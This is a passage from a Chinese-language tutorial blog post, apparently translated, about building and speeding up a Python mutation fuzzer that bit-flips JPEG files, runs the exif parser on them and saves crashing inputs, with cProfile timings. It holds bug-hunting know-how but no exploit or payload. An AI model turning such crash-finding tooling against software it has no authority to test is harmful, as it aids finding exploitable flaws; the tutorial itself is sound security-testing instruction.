iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:        current = data[x]        current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))        current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current                indexes = range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)        picked_index = random.choice(indexes)        new_number = []        <span class="hljs-comment"># our new_number list now has all the digits, example: [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;]</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> current:            new_number.append(i)        <span class="hljs-comment"># if the number at our randomly selected index is a 1, make it a 0, and vice versa</span>        <span class="hljs-keyword">if</span> new_number[picked_index] == <span class="hljs-string">&quot;1&quot;</span>:            new_number[picked_index] = <span class="hljs-string">&quot;0&quot;</span>        <span class="hljs-keyword">else</span>:            new_number[picked_index] = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment"># create our new binary string of our bit-flipped number</span>        current = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_number:            current += i        <span class="hljs-comment"># convert that string to an integer</span>        current = int(current,<span class="hljs-number">2</span>)        <span class="hljs-comment"># change the number in our byte array to our new number we just constructed</span>        data[x] = current    <span class="hljs-keyword">return</span> data<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">data</span>):</span>    magic_vals = [    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">127</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">128</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">64</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">127</span>)    ]    picked_magic = random.choice(magic_vals)    length = len(data) - <span class="hljs-number">8</span>    index = range(<span class="hljs-number">0</span>, length)    picked_index = random.choice(index)    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (1, )</span>    <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFF</span>            data[picked_index] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7F</span>            data[picked_index] = <span class="hljs-number">127</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00</span>            data[picked_index] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (2, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x0000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all of the byte overwrites for all of the tuples that being (4, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFFFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00000000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">128</span>:<span class="hljs-comment"># 0x80000000</span>            data[picked_index] = <span class="hljs-number">128</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">64</span>:<span class="hljs-comment"># 0x40000000</span>            data[picked_index] = <span class="hljs-number">64</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7FFFFFFF</span>            data[picked_index] = <span class="hljs-number">127</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>            <span class="hljs-keyword">return</span> data<span class="hljs-comment"># create new jpg with mutated data</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_new</span>(<span class="hljs-params">data</span>):</span>    f = open(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)    f.write(data)    f.close()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    command = <span class="hljs-string">&quot;exif mutated.jpg -verbose&quot;</span>    out, returncode = run(<span class="hljs-string">&quot;sh -c &quot;</span> + quote(command), withexitstatus=<span class="hljs-number">1</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Segmentation&quot;</span> <span class="hljs-keyword">in</span> out:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)        print(<span class="hljs-string">&quot;Segfault!&quot;</span>)    <span class="hljs-comment">#if counter % 100 == 0:</span>    <span class="hljs-comment">#print(counter, end=&quot;\r&quot;)</span><span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:    print(<span class="hljs-string">&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;</span>)<span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; <span class="hljs-number">1000</span>:        data = get_bytes(filename)        functions = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]        picked_function = random.choice(functions)        picked_function = <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> picked_function == <span class="hljs-number">0</span>:            mutated = magic(data)            create_new(mutated)            exif(counter,mutated)        <span class="hljs-keyword">else</span>:            mutated = bit_flip(data)            create_new(mutated)            exif(counter,mutated)        counter += <span class="hljs-number">1</span></code></pre><p>你或许注意到一些改变，我们改了：</p><ul><li>每100次迭代注释掉迭代计数器的打印语句</li><li>添加用于提醒我们任何<code>Segfaults</code>的打印语句</li><li>硬编码1k次迭代</li><li>临时添加一行新代码<code>picked_function=1</code>，以便我们消除我们测试中的随机性，我们只一直用一种变异策略（<code>bit_flip()</code>）</li></ul><p>让我们用一些分析工具跑我们新版的<code>fuzzer</code>，我们可以实际分析在我们程序执行时我们花费的时间</p><p>我们可以利用<code>cProfile</code>的<code>Python module</code>，看看在<code>1000</code>次<code>fuzzing</code>迭代中我们把时间花在哪里了，如果你还记得的，这个程序会把一个合规的<code>JPEG</code>文件作为路径参数，因此我们完整的命令行语法就像<code>python3 -m cProfile -s cumtime JPEGfuzzer.py ~/jpegs/Canon_40D.jpg</code>所示。</p><p><strong>需要注意的是，添加这个<code>cProfile</code>工具会降低性能，我测试时是没带这个工具，在该文章中对于这个迭代大小，这似乎是不会造成显著差异</strong></p><p>在这次运行之后，我们可以看到我们的程序的输出，并且我们可以看到在执行中我们最花时间的地方。</p><pre><code class="hljs yaml"><span class="hljs-number">2476093</span> <span class="hljs-string">function</span> <span class="hljs-string">calls</span> <span class="hljs-string">(2474812</span> <span class="hljs-string">primitive</span> <span class="hljs-string">calls)</span> <span class="hljs-string">in</span> <span class="hljs-number">122.084</span> <span class="hljs-string">seconds</span>   <span class="hljs-attr">Ordered by:</span> <span class="hljs-string">cumulative</span> <span class="hljs-string">time</span>   <span class="hljs-string">ncalls</span>  <span class="hljs-string">tottime</span>  <span class="hljs-string">percall</span>  <span class="hljs-string">cumtime</span>  <span class="hljs-string">percall</span> <span class="hljs-string">filename:lineno(function)</span>     <span class="hljs-number">33</span><span class="hljs-string">/1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">122.084</span>  <span class="hljs-number">122.084</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">builtins.exec</span>&#125;        <span class="hljs-number">1</span>    <span class="hljs-number">0.108</span>    <span class="hljs-number">0.108</span>  <span class="hljs-number">122.084</span>  <span class="hljs-number">122.084</span> <span class="hljs-string">blog.py:3(&lt;module&gt;)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.090</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">118.622</span>    <span class="hljs-number">0.119</span> <span class="hljs-string">blog.py:140(exif)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.080</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">118.452</span>    <span class="hljs-number">0.118</span> <span class="hljs-string">run.py:7(run)</span>     <span class="hljs-number">5432  </span><span class="hljs-number">103.761</span>    <span class="hljs-number">0.019</span>  <span class="hljs-number">103.761</span>    <span class="hljs-number">0.019</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">time.sleep</span>&#125;     <span class="hljs-number">1000    </span><span class="hljs-number">0.028</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">100.923</span>    <span class="hljs-number">0.101</span> <span class="hljs-string">pty_spawn.py:316(close)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.025</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">100.816</span>    <span class="hljs-number">0.101</span> <span class="hljs-string">ptyprocess.py:387(close)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.061</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">9.949</span>    <span class="hljs-number">0.010</span> <span class="hljs-string">pty_spawn.py:36(__init__)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.074</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">9.764</span>    <span class="hljs-number">0.010</span> <span class="hljs-string">pty_spawn.py:239(_spawn)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.041</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">8.682</span>    <span class="hljs-number">0.009</span> <span class="hljs-string">pty_spawn.py:312(_spawnpty)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.266</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">8.641</span>    <span class="hljs-number">0.009</span> <span class="hljs-string">ptyprocess.py:178(spawn)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.011</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.491</span>    <span class="hljs-number">0.007</span> <span class="hljs-string">spawnbase.py:240(expect)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.036</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.479</span>    <span class="hljs-number">0.007</span> <span class="hljs-string">spawnbase.py:343(expect_list)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.128</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.409</span>    <span class="hljs-number">0.007</span> <span class="hljs-string">expect.py:91(expect_loop)</span>     <span class="hljs-number">6432    </span><span class="hljs-number">6.473</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">6.473</span>    <span class="hljs-number">0.001</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.read</span>&#125;     <span class="hljs-number">5432    </span><span class="hljs-number">0.089</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.818</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">pty_spawn.py:415(read_nonblocking)</span>     <span class="hljs-number">7348    </span><span class="hljs-number">0.029</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.162</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">utils.py:130(select_ignore_interrupts)</span>     <span class="hljs-number">7348    </span><span class="hljs-number">3.127</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.127</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">select.select</span>&#125;     <span class="hljs-number">1000    </span><span class="hljs-number">0.790</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">1.777</span>    <span class="hljs-number">0.002</span> <span class="hljs-string">blog.py:15(bit_flip)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.015</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.311</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">blog.py:134(create_new)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.100</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.101</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">pty.py:79(fork)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">1.000</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">1.000</span>    <span class="hljs-number">0.001</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.forkpty</span>&#125;<span class="hljs-string">-----SNIP-----</span></code></pre><p>对于这种类型的分析，我们并不真正关心我们有多少<code>segfaults</code>，因为我们并没有真正修改变异方法或比较不同的方法。当然这里会有一些随机性，因为<code>crash</code>需要额外的处理，但现在就可以了。</p><p>我只截了我们累计花费了超过<code>1.0s</code>的代码段，你可以看到迄今为止我们花费了最多的时间在<code>blog.py:140(exif)</code>，在<code>122s</code>中占了惊人的<code>118s</code>，我们<code>exif()</code>函数似乎成为我们性能的最大的问题。</p><p>我们可以看到在这个函数下我们花费的大部分时间都是直接跟这个函数相关的，从<code>pexpect</code>用法中我们可以看到大量对<code>pty</code>模块的诉求（<code>appeal to the pty module</code>，笔者感觉就是对该模块的调用），让我们重写我们的函数用<code>subprocess</code>模块的<code>Popen</code>，看看是否我们可以提升性能吧。</p><p>我们重定义<code>exif()</code>函数如下：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    p = Popen([<span class="hljs-string">&quot;exif&quot;</span>, <span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;-verbose&quot;</span>], stdout=PIPE, stderr=PIPE)    (out,err) = p.communicate()    <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">-11</span>:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)        print(<span class="hljs-string">&quot;Segfault!&quot;</span>)    <span class="hljs-comment">#if counter % 100 == 0:</span>    <span class="hljs-comment">#print(counter, end=&quot;\r&quot;)</span></code></pre><p>我们的性能报告如下：</p><pre><code class="hljs profile"><span class="hljs-number">2065580</span> function calls (<span class="hljs-number">2065443</span> primitive calls) in <span class="hljs-number">2.756</span> seconds   Ordered by: cumulative time   <span class="hljs-keyword">ncalls</span>  <span class="hljs-keyword">tottime</span>  percall  <span class="hljs-keyword">cumtime</span>  percall <span class="hljs-keyword">filename</span>:lineno(function)     <span class="hljs-number">15</span>/<span class="hljs-number">1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.756</span>    <span class="hljs-number">2.756</span> &#123;built-in method builtins.exec&#125;        1    0.038    0.038    2.756    2.756 subpro.py:<span class="hljs-number">3</span>(<span class="hljs-string">&lt;module&gt;</span>)     <span class="hljs-number">1000</span>    <span class="hljs-number">0.020</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.917</span>    <span class="hljs-number">0.002</span> subpro.py:<span class="hljs-number">139</span>(<span class="hljs-string">exif</span>)     <span class="hljs-number">1000</span>    <span class="hljs-number">0.026</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.121</span>    <span class="hljs-number">0.001</span> subprocess.py:<span class="hljs-number">681</span>(<span class="hljs-string">__init__</span>)     <span class="hljs-number">1000</span>    <span class="hljs-number">0.099</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.045</span>    <span class="hljs-number">0.001</span> subprocess.py:<span class="hljs-number">1412</span>(<span class="hljs-string">_execute_child</span>) -----SNIP-----</code></pre><p>区别是什么，这用重定义的<code>exif()</code>函数的<code>fuzzer</code>在相同数目的工作量下仅仅需要<code>2s</code>！！以前的<code>fuzzer: 122s</code>，新的<code>fuzzer: 2.7s</code></p><h2 id="Improving-Further-in-Python"><a href="#Improving-Further-in-Python" class="headerlink" title="Improving Further in Python"></a>Improving Further in Python</h2><p>让我们尝试在<code>Python</code>中继续改进我们的<code>fuzzer</code>,首先，让我们得到一个好的基准，可以让我们对照着执行，我们将让我们的优化的<code>Python fuzzer</code>迭代50000次，我们将再次使用<code>cProfile</code>模块来获得一些关于我们花费时间的细粒度统计。</p><pre><code class="hljs yaml"><span class="hljs-number">102981395</span> <span class="hljs-string">function</span> <span class="hljs-string">calls</span> <span class="hljs-string">(102981258</span> <span class="hljs-string">primitive</span> <span class="hljs-string">calls)</span> <span class="hljs-string">in</span> <span class="hljs-number">141.488</span> <span class="hljs-string">seconds</span>   <span class="hljs-attr">Ordered by:</span> <span class="hljs-string">cumulative</span> <span class="hljs-string">time</span>   <span class="hljs-string">ncalls</span>  <span class="hljs-string">tottime</span>  <span class="hljs-string">percall</span>  <span class="hljs-string">cumtime</span>  <span class="hljs-string">percall</span> <span class="hljs-string">filename:lineno(function)</span>     <span class="hljs-number">15</span><span class="hljs-string">/1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">141.488</span>  <span class="hljs-number">141.488</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">builtins.exec</span>&#125;        <span class="hljs-number">1</span>    <span class="hljs-number">1.724</span>    <span class="hljs-number">1.724</span>  <span class="hljs-number">141.488</span>  <span class="hljs-number">141.488</span> <span class="hljs-string">subpro.py:3(&lt;module&gt;)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.992</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">102.588</span>    <span class="hljs-number">0.002</span> <span class="hljs-string">subpro.py:139(exif)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.248</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">61.562</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:681(__init__)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">5.034</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">57.826</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1412(_execute_child)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.437</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">39.586</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:920(communicate)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">2.527</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">39.064</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1662(_communicate)</span>   <span class="hljs-number">208254</span>   <span class="hljs-number">37.508</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">37.508</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.read</span>&#125;   <span class="hljs-number">158238</span>    <span class="hljs-number">0.577</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">28.809</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:402(select)</span>   <span class="hljs-number">158238</span>   <span class="hljs-number">28.131</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">28.131</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;poll&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;select.poll&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>   <span class="hljs-number">11.784</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">25.819</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subpro.py:14(bit_flip)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.666</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">10.431</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:256(choice)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">8.421</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">8.421</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">_posixsubprocess.fork_exec</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.162</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.358</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:133(create_new)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">4.096</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">6.130</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:224(_randbelow)</span>   <span class="hljs-number">203090</span>    <span class="hljs-number">5.016</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">5.016</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">io.open</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">4.211</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.211</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedRandom&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">1.643</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.194</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:617(get_exec_path)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.733</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.356</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:8(get_bytes)</span> <span class="hljs-number">35866791</span>    <span class="hljs-number">2.635</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.635</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;append&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;list&#x27;</span> <span class="hljs-string">objects</span>&#125;   <span class="hljs-number">100000</span>    <span class="hljs-number">0.070</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.960</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1014(wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.252</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.902</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:351(register)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.444</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.890</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1621(_wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.675</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.583</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:234(register)</span>   <span class="hljs-number">350000</span>    <span class="hljs-number">0.432</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.501</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1471(&lt;genexpr&gt;)</span> <span class="hljs-number">12074141</span>    <span class="hljs-number">1.434</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.434</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;getrandbits&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.059</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.358</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1608(_try_wait)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.299</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.299</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.waitpid</span>&#125;   <span class="hljs-number">100000</span>    <span class="hljs-number">0.488</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.058</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:674(__getitem__)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">1.017</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.017</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedReader&#x27;</span> <span class="hljs-string">objects</span>&#125;<span class="hljs-string">-----SNIP-----</span></code></pre><p>50000次迭代总共花费了我们141s，与我们正在处理的相比，这个性能是不错的了，我们之前做1000次迭代可用了122s！再次过滤只在我们花费了超过1.0s时间的地方，我们发现还是在<code>exif()</code>中花费了大部分时间，但是我们同样在<code>bit_flip()</code>中也发现了一些性能问题，因为我们在这累计花费了25s，让我们尝试优化一点这个函数吧。</p><p>让我们继续并贴出旧<code>bit_flip()</code>函数</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:        current = data[x]        current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))        current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current                indexes = range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)        picked_index = random.choice(indexes)        new_number = []        <span class="hljs-comment"># our new_number list now has all the digits, example: [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;]</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> current:            new_number.append(i)        <span class="hljs-comment"># if the number at our randomly selected index is a 1, make it a 0, and vice versa</span>        <span class="hljs-keyword">if</span> new_number[picked_index] == <span class="hljs-string">&quot;1&quot;</span>:            new_number[picked_index] = <span class="hljs-string">&quot;0&quot;</span>        <span class="hljs-keyword">else</span>:            new_number[picked_index] = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment"># create our new binary string of our bit-flipped number</span>        current = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i 